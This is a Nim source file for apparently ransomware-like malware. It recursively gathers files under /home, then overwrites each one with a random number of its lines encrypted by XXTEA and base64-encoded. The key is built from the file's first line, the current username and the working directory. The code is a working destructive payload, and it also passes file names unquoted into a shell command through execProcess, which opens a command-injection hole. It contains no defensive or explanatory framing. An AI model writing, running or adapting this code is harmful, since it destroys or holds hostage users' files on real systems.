import streams, osproc, xxtea, strutils, base64, os, lists, random

#nimble install xxtea

# key is based on the following:
 #1. First line of the file
 #2. Current user's username
 #3. Current working directory
proc generateKey(filename: string): string =
 var strm = newFileStream(filename, fmRead)
 var key = strm.readLine
 strm.close()
 var username = execProcess("whoami")
 var currentDir = execProcess("pwd")
 key = key & " " & username & " " & currentDir
 return key

#uses wc -l to calculate the number of lines in the file, this is then used to determine the max amount of lines to encrypt. We then generate a random # between 1 and the 
#max # of lines to encrypt & encrypt x amount of lines
proc countLines(filename: string): int =
 var numOfLinesExcess = execProcess("wc -l " & filename)
 var numOfLines = numOfLinesExcess.strip()
 var whiteSpaceIndex = find(numOfLines, " ")
 return parseInt(numOfLines[0..whiteSpaceIndex-1])

#encrypt file procedure
proc bstryFiles(filename: string, maxNumOfLines: int) =
 #implement error handling for opening & writing to files that we don't have permission to write to
 randomize()
 var numOfLines = rand(1..maxNumOfLines)
 var linesToEncrypt = readLines(filename, numOfLines)
 var buffer = ""
 var indx: int
 var key = generateKey(filename)
 for line in filename.lines:
  if indx <= len(linesToEncrypt)-1:
   if linesToEncrypt[indx] == line:
    buffer.add(line.replace(line, encode(xxtea.encrypt(line, key))) & '\x0A')
    indx = indx + 1
  else:
   buffer.add(line & '\x0A')
 writeFile(filename, buffer)
 return

#gathering filepaths & appending them to targetPaths list
var targetPaths = initDoublyLinkedList[string]()
var basePath = "/home/*"
#runningFile - name of current runing file, avoids encrypting it
var runningFile = paramStr(0).split("/")[len(paramStr(0).split("/"))-1]
for i in 0..500:
 for file in walkFiles(basePath):
  if file.split("/")[len(file.split("/"))-1] == runningFile:
   echo "running binary found. skipping..."
  else:
   targetPaths.append(file)
 basepath = basepath & "/*"


for i in targetPaths:
 echo "Encrypting:", i
 var lineCount = countLines(i)
 bstryFiles(i, lineCount)
